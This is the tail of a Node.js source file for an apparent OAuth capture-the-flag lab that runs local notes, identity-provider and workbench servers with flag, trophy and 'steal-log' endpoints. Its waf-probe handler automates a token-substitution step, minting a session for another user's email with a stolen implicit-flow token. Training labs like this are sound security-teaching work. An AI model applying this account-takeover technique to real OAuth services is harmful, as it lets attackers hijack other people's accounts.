      first: first.json,
      second: second.json,
      flag: second.json && second.json.flag,
    });
  });

  app.post('/api/waf-probe', async (_req, res) => {
    const cookie = await idpLogin('alice.social', 'letmein');
    const auth = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: REGISTERED_REDIRECT,
      responseType: 'token',
    }), { headers: { Cookie: cookie } });
    const token = parseHashToken(auth.location);
    const wafPort = Number(process.env.WAF_PORT || 9080);
    const minted = await requestJson('127.0.0.1', wafPort, 'POST', '/authenticate', {
      body: JSON.stringify({ token, email: 'carlos@harbor.notes' }),
    });
    res.json({
      ok: true,
      status: minted.status,
      blocked: minted.status === 403,
      body: minted.json || minted.body.slice(0, 400),
    });
  });

  app.get('/api/trophy', (req, res) => {
    const stages = String(req.query.stages || '')
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean);
    const need = ['implicit', 'linking', 'hijack', 'proxy', 'openredir', 'reuse'];
    const complete = need.every((s) => stages.includes(s) || stages.includes(FLAGS[s]));
    res.json({ ok: complete, need, got: stages, flag: complete ? FLAGS.complete : null });
  });

  app.get('/api/steal-log', (_req, res) => res.json({ ok: true, stealLog }));
}

function workbenchApp() {
  const app = express();
  app.disable('x-powered-by');
  app.use(express.json());
  app.use(express.urlencoded({ extended: false }));
  workbenchHandlers(app);
  return app;
}

async function main() {
  resetLab();
  await new Promise((resolve, reject) => {
    const s = notesApp().listen(NOTES_PORT, '0.0.0.0', resolve);
    s.on('error', reject);
  });
  await new Promise((resolve, reject) => {
    const s = idpApp().listen(IDP_PORT, '0.0.0.0', resolve);
    s.on('error', reject);
  });
  await new Promise((resolve, reject) => {
    const s = workbenchApp().listen(WORKBENCH_PORT, '0.0.0.0', resolve);
    s.on('error', reject);
  });
  console.log(`[oauth] notes :${NOTES_PORT}  idp :${IDP_PORT}  workbench :${WORKBENCH_PORT}`);
}

if (require.main === module) {
  main().catch((err) => {
    console.error(err);
    process.exit(1);
  });
}

module.exports = { FLAGS, NOTES_USERS, SOCIAL_USERS, store, resetLab };
